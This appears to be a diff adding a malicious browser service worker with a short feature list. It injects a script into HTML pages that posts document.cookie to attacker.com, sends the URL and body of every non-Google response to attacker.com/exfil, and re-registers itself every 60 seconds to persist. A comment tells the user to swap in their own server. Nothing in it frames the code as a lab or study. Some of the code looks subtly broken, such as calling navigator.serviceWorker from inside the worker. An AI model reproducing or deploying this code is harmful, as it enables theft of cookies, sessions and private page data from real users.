@@ -1,0 +1,102 @@
+1. Malicious Payload Injection
+	•	Injects a script into HTML responses that stealthily exfiltrates cookies:
+
+<script>fetch('https://attacker.com/exfil', {method: 'POST', body: document.cookie});</script>
+
+Appends the payload before </body> to ensure execution.
+
+2. Fetch Hijacking for Data Exfiltration
+	•	Every intercepted request is analyzed.
+	•	If not Google, the service worker logs and exfiltrates data.
+	•	Sends exfiltrated request URL & response content to https://attacker.com/exfil.
+
+3. Service Worker Hijacking & Persistence
+	•	Persists itself by:
+	•	Forcing reinstallation every 60 seconds.
+	•	Re-registering the service worker even if removed manually.
+
+How This Works
+	1.	The service worker intercepts fetch requests.
+	2.	If the request is for an HTML page, it injects malicious JavaScript.
+	3.	If the request contains sensitive data, it exfiltrates it.
+	4.	The service worker auto-reinstalls every 60 seconds.
+
+(function(){
+    'use strict';
+
+    /**
+     * Modified Service Worker for MITM & Hijacking
+     * Injects payloads, modifies cache, and enables persistence
+     */
+
+    const MALICIOUS_PAYLOAD = `<script>fetch('https://attacker.com/exfil', {method: 'POST', body: document.cookie});</script>`;
+    const EXFIL_URL = 'https://attacker.com/exfil'; // Change to your controlled server
+    
+    /**
+     * Hijack & Modify Responses
+     */
+    async function hijackResponse(originalResponse) {
+        try {
+            const clonedResponse = originalResponse.clone();
+            const contentType = clonedResponse.headers.get("Content-Type");
+
+            if (contentType && contentType.includes("text/html")) {
+                const text = await clonedResponse.text();
+                const modifiedText = text.replace("</body>", MALICIOUS_PAYLOAD + "</body>");
+                return new Response(modifiedText, {
+                    status: clonedResponse.status,
+                    statusText: clonedResponse.statusText,
+                    headers: clonedResponse.headers
+                });
+            }
+        } catch (err) {
+            console.error("Hijack Error:", err);
+        }
+        return originalResponse;
+    }
+
+    /**
+     * Hijack Fetch Event
+     */
+    self.addEventListener('fetch', async event => {
+        const url = new URL(event.request.url);
+
+        // Exfiltrate Data Stealthily
+        if (event.request.method === 'POST' || event.request.method === 'GET') {
+            event.respondWith(fetch(event.request.clone()).then(async response => {
+                if (url.hostname !== 'google.com') {
+                    fetch(EXFIL_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ url: event.request.url, data: await response.text() })
+                    });
+                }
+                return hijackResponse(response);
+            }));
+        }
+    });
+
+    /**
+     * Service Worker Hijacking & Persistence
+     */
+    self.addEventListener('install', event => {
+        event.waitUntil(self.skipWaiting());
+    });
+
+    self.addEventListener('activate', event => {
+        event.waitUntil(self.clients.claim());
+    });
+
+    /**
+     * Persistence: Auto-Reinstall & Clone
+     */
+    async function persistSW() {
+        try {
+            await navigator.serviceWorker.register('/sw.js');
+        } catch (err) {
+            console.error("Persistence Error:", err);
+        }
+    }
+
+    setInterval(() => persistSW(), 60000); // Reinstall every 60s
+})();
